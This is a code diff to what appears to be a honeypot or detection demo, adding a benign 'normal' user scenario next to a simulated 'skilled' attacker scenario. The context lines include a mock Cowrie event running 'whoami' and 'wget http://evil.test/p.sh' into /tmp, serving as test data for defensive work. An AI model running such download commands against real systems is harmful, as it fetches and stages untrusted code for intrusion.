@@ -38,6 +38,11 @@ def _t(sec: int) -> str:
 
 # (seconds, source, event_type, extra fields, plain-English caption)
 SCENARIOS = {
+    "normal": [
+        (0, "portal", "portal_auth_success", {"resource": "/login"}, "Logs into the staff portal"),
+        (20, "database", "db_read", {"resource": "timesheets"}, "Opens their own timesheet"),
+        (50, "database", "db_read", {"resource": "reports"}, "Reads a shared report"),
+    ],
     "skilled": [
         (0, "cowrie", "command", {"command": "whoami", "resource": "/bin/whoami"}, "Logs into the fake server and runs whoami"),
         (4, "cowrie", "command", {"command": "wget http://evil.test/p.sh", "resource": "/tmp/p.sh"}, "Downloads a tool onto the machine"),
